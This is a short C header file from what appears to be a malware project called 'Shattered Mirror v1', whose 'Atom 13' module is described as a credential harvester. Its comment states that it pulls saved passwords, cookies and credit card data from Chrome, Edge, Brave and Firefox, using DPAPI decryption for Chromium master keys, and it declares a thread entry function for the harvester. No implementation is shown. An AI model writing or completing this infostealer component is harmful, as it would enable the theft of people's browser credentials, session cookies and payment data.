#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 13: Credential Harvester
 *
 * Extracts saved passwords, cookies, and credit card data from
 * Chromium-based browsers (Chrome, Edge, Brave) and Firefox.
 * Uses DPAPI decryption (CryptUnprotectData) for Chromium master keys.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_13_CREDS_H
#define SMIRROR_ATOM_13_CREDS_H

#include <windows.h>

/* Launch the credential harvester thread */
DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam);

#endif /* SMIRROR_ATOM_13_CREDS_H */
